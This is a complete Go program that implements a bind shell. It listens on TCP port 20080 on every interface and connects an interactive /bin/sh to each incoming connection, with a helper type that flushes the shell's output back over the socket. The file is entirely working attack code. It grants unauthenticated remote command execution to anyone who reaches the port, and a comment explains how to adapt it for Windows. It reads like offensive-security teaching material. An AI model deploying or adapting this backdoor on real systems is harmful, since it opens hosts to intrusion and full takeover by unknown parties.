package main

import (
  "net"
  "os/exec"
  "bufio"
  "log"
  "io"
)

// Flusher wraps bufio.Writer, explicitly flushing on all writes.
type Flusher struct {
  w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer.
func NewFlusher(w io.Writer) *Flusher {
  return &Flusher{
    w: bufio.NewWriter(w),
  }
}

// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
  count, err := foo.w.Write(b)
  if err != nil {
    return -1, err
  }
  if err := foo.w.Flush(); err != nil {
    return -1, err
  }
  return count, err
}

func handle(conn net.Conn) {
  // Explicitly calling /bin/sh and using -i for interactive mode
  // so that we can use it for stdin and stdout.
  // For Windows use exec.Command("cmd.exe").
  cmd := exec.Command("/bin/sh", "-i")

  // Set stdin to our connection
  cmd.Stdin = conn

  // Create a Flusher from the connection to use for stdout.
  // This ensures stdout is flushed adequately and set via net.Conn.
  cmd.Stdout = NewFlusher(conn)

  // Run the command.
  if err := cmd.Run(); err != nil {
    log.Fatalln(err)
  }
}

func main() {
  // Bind to TCP port 20080 on all interfaces.
  listener, err := net.Listen("tcp", ":20080")
  if err != nil {
    log.Fatalln("Unable to bind to port")
  }
  log.Println("Listening on 0.0.0.0:20080")
  for {
    // Wait for connection. Create net.Conn on connection established.
    conn, err := listener.Accept()
    log.Println("Received connection")
    if err != nil {
      log.Fatalln("Unable to accept connection")
    }
    // Handle the connection. Using goroutine for concurrency.
    go handle(conn)
  }
}
